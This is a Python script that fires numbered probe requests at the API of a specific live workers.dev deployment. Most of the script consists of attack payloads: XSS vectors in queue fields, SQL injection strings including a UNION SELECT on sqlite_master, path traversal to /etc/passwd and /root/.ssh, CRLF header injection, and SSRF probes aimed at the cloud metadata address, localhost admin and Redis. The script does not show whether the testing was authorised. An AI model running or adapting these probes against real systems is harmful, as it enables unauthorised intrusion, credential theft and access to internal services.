import json, urllib.request
from pathlib import Path

BASE = "https://phoenix-coder.mrmichaelhobbs123.workers.dev"

def call(ep, method, body=None):
    url = f"{BASE}/api/{ep}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json", "User-Agent": "curl/7.88.1"},
        method=method
    )
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            return r.status, r.read()[:400].decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode(errors="replace")
    except Exception as e:
        return type(e).__name__, str(e)[:400]

# P13: batch null/garbage tasks
print('=== P13: batch null tasks ===')
for b in [{"tasks": None}, {"tasks": [{"task": None}]}, {"tasks": [{"targetfile": "x.js"}]}]:
    print(call("code/batch", "POST", b))

# P14: queue XSS vectors
print('=== P14: queue XSS vectors ===')
xss_variants = [
    {"task": "xss", "targetfile": "<svg onload=alert(1)>"},
    {"task": "xss", "targetfile": "javascript:alert(1)"},
    {"task": 'xss";alert(1)//', "targetfile": "x.js"},
    {"task": "xss", "targetfile": '" onfocus=alert(1) "'},
]
for b in xss_variants:
    print(call("queue", "POST", b))

# P15: log SQLi vectors
print('=== P15: log SQLi + limit ===')
print(call("log", "GET"))
print(call("log", "GET", {"limit": "' OR 1=1 --"}))
print(call("log", "GET", {"type": "' UNION SELECT sqlite_master --"}))

# P16: brain recall XSS/path traversal
print('=== P16: brain vectors ===')
print(call("brain/recall", "GET", {"q": ""}))
print(call("brain/remember", "POST", {"tag": "../etc/passwd", "chunk": "/root/.ssh"}))
print(call("brain/recall", "GET", {"q": "REDACTED"}))

# P17: CT guard on thin varargs
print('=== P17: CT guard thin ===')
print(call("code", "POST", {"task": "hello", "targetfile": "t.js", "maxTokens": 8}))

# P18: limit overflow + negative
print('=== P18: limit extremes ===')
print(call("log", "GET", {"limit": "9999999999"}))
print(call("log", "GET", {"limit": "-1"}))

# P19: CRLF injection fields
print('=== P19: CRLF injection ===')
print(call("queue", "POST", {"task": "test\r\nX-Injected: true", "targetfile": "x.js"}))

# P20: SSRF in queue webhookUrl
print('=== P20: SSRF probes ===')
ssrf_urls = [
    "http://localhost:8080/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/",
    "http://[::1]:22/",
]
for u in ssrf_urls:
    print(call("queue", "POST", {"task": "ssrf", "targetfile": "x.js", "webhookUrl": u}))
